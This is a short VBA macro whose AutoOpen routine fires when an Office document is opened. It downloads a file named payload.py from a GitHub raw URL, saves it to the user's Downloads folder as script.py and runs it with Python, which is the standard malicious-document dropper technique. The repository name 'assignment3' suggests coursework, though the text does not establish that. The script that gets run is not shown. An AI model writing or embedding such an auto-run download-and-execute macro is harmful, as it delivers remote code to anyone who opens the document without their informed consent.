Sub AutoOpen()
    Dim http As Object
    Dim stream As Object
    Dim url As String
    Dim savePath As String
    Dim shell As Object

    url = "https://raw.githubusercontent.com/wowjulian/assignment3/refs/heads/main/payload.py"
    saveDir = Environ("USERPROFILE") & "\Downloads"
    savePath = Environ("USERPROFILE") & "\Downloads\script.py"
    Set http = CreateObject("MSXML2.XMLHTTP")

    http.Open "GET", url, False
    http.Send

    If http.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write http.responseBody
        stream.SaveToFile savePath, 2 ' 2 = overwrite
        stream.Close

        MsgBox "Successfully downloaded the script at " & savePath

        Set shell = CreateObject("WScript.Shell")

        shell.Run "python """ & savePath & """", vbNormalFocus
    Else
        MsgBox "Failed to run the script. Status: " & http.Status
    End If
End Sub
